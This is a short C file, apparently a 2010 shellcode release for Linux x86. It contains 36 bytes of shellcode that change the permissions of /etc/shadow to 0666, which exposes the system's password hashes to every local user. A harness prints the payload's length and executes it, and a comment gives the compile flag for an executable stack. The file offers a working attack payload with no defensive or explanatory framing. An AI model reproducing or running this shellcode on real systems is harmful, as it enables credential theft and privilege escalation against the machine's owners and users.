#include <stdio.h>
#include <string.h>

/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 36 bytes chmod("/etc/shadow", 0666) shellcode
Platform: Linux x86

chmod("/etc/shadow", 0666);
gcc -Wl,-z,execstack filename.c

shellcode:

\xeb\x12\x5b\x31\xc0\x31\xc9\x31\xd2\xb1\xb6\xb5\x01\xb0\x0f\x89\x53\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77

*/


int main(){
char shell[] =
"\xeb\x12\x5b\x31\xc0\x31\xc9\x31\xd2\xb1\xb6\xb5\x01\xb0\x0f\x89\x53\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}